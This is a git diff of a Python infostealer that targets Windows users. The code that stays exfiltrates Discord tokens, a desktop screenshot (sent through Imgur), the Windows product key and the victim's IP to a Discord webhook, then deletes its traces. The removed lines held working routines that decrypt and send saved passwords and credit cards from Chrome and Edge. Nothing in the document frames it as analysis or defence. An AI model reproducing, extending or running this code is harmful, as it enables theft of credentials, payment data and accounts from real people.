@@ -34,17 +34,20 @@ hook = Webhook(f"{server}")
 
 # IMGUR DESKTOP-IMAGE UPLOAD
 def upload():
-    imgur = requests.post(
-        r'https://api.imgur.com/3/upload.json', 
-        headers = {"Authorization": "Client-ID #CLIENT-ID GOES HERE"},
-        data = {
-            'key': '# CLIENT SECRET GOES HERE', 
-            'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
-            'type': 'base64',
-            'name': f'{name}.jpg',
-            'title': 'victim\'s desktop'})
-    image = imgur.json()['data']['link']
-    return image
+    try:
+        imgur = requests.post(
+            r'https://api.imgur.com/3/upload.json', 
+            headers = {"Authorization": "Client-ID #CLIENT-ID GOES HERE"},
+            data = {
+                'key': '# CLIENT SECRET GOES HERE', 
+                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
+                'type': 'base64',
+                'name': f'{name}.jpg',
+                'title': 'victim\'s desktop'})
+        image = imgur.json()['data']['link']
+        return image
+    except:
+        pass
 
 # VARIABLES
 ip = requests.get("https://api.ipify.org").text
@@ -201,100 +204,6 @@ def dpassword(buff, master_key):
         pass
 
 
-def creditsteal():
-    master_key = master()
-    login_db = os.environ['USERPROFILE'] + os.sep + \
-        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
-    shutil.copy2(login_db,
-                 "CCvault.db")
-    conn = sqlite3.connect("CCvault.db")
-    cursor = conn.cursor()
-
-    try:
-        cursor.execute("SELECT * FROM credit_cards")
-        for r in cursor.fetchall():
-            username = r[1]
-            encrypted_password = r[4]
-            decrypted_password = dpassword(
-                encrypted_password, master_key)
-            expire_mon = r[2]
-            expire_year = r[3]
-            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
-                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
-    except:
-        pass
-    cursor.close()
-    conn.close()
-    try:
-        os.remove("CCvault.db")
-    except:
-        pass
-
-
-# MICROSOFT EDGE | PASSWORD & CREDIT-CARDS :
-def passwordsteal():
-    master_key = master()
-    login_db = os.environ['USERPROFILE'] + os.sep + \
-        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
-    try:
-        shutil.copy2(login_db, "Loginvault.db")
-    except:
-        pass
-    conn = sqlite3.connect("Loginvault.db")
-    cursor = conn.cursor()
-
-    try:
-        cursor.execute(
-            "SELECT action_url, username_value, password_value FROM logins")
-        for r in cursor.fetchall():
-            url = r[0]
-            username = r[1]
-            encrypted_password = r[2]
-            decrypted_password = dpassword(
-                encrypted_password, master_key)
-            if username != "" or decrypted_password != "":
-                hook.send(f"URL: " + url + "\nUSER: " + username +
-                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
-    except:
-        pass
-
-    cursor.close()
-    conn.close()
-
-
-def creditsteals():
-    master_key = master()
-    login_db = os.environ['USERPROFILE'] + os.sep + \
-        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
-    try:
-        shutil.copy2(login_db, "CCvault.db")
-    except:
-        conn = sqlite3.connect("Loginvault.db")
-        cursor = conn.cursor()
-        conn = sqlite3.connect("CCvault.db")
-        cursor = conn.cursor()
-
-    try:
-        cursor.execute("SELECT * FROM credit_cards")
-        for r in cursor.fetchall():
-            username = r[1]
-            encrypted_password = r[4]
-            decrypted_password = dpassword(
-                encrypted_password, master_key)
-            expire_mon = r[2]
-            expire_year = r[3]
-            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
-                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
-    except:
-        pass
-    cursor.close()
-    conn.close()
-    try:
-        os.remove("CCvault.db")
-    except:
-        pass
-
-
 # DISCORD TOKEN EXTRACTION
 def sniff(path):
     path += '\\Local Storage\\leveldb'
@@ -312,21 +221,24 @@ def sniff(path):
     return tokens
 
 def gotcha():
-    passwordsteal()
-    creditsteal()
-    creditsteals()
     # SCREENSHOT VARIABLES :
-    screenshot = ImageGrab.grab()
-    screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
-    screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
-    screenshot.close()
+    try:
+        screenshot = ImageGrab.grab()
+        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
+        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
+        screenshot.close()
+    except:
+        pass
     
     # .ZIP VARIABLES :
-    zname = r'C:\ProgramData\passwords.zip'
-    newzip = zipfile.ZipFile(zname, 'w')
-    newzip.write(r'C:\ProgramData\passwords.txt')
-    newzip.close()
-    passwords = File(r'C:\ProgramData\passwords.zip')
+    try:
+        zname = r'C:\ProgramData\passwords.zip'
+        newzip = zipfile.ZipFile(zname, 'w')
+        newzip.write(r'C:\ProgramData\passwords.txt')
+        newzip.close()
+        passwords = File(r'C:\ProgramData\passwords.zip')
+    except:
+        pass
 
     # WINKEY VARIABLES :
     try:
@@ -369,12 +281,15 @@ def gotcha():
         message += '```'
 
     # SEND OUR ASSETS VIA DISCORD WEBHOOK :
-    embed = Embed(title='gotcha!',description='victim\'s information => successfully extracted',color=0x2f3136,timestamp='now')
-    embed.add_field("winkey:",f"user => {usr}\ntype => {types}\nkey => {keys}")
-    embed.add_field("tokens:",message)
-    embed.add_field("IP:",f"{ip}")
-    embed.set_image(url=upload())
-    hook.send(embed=embed, file=passwords)
+    try:
+        embed = Embed(title='gotcha!',description='victim\'s information => successfully extracted',color=0x2f3136,timestamp='now')
+        embed.add_field("winkey:",f"user => {usr}\ntype => {types}\nkey => {keys}")
+        embed.add_field("tokens:",message)
+        embed.add_field("IP:",f"{ip}")
+        embed.set_image(url=upload())
+        hook.send(embed=embed, file=passwords)
+    except:
+        pass
 
 
     # ATTEMPT TO REMOVE EVIDENCE :
@@ -382,6 +297,7 @@ def gotcha():
         subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
         subprocess.os.system(r'del C:\ProgramData\passwords.zip')
         subprocess.os.system(r'del C:\ProgramData\passwords.txt')
+        subprocess.os.system(r'del Loginvault.db')
     except:
         pass
 
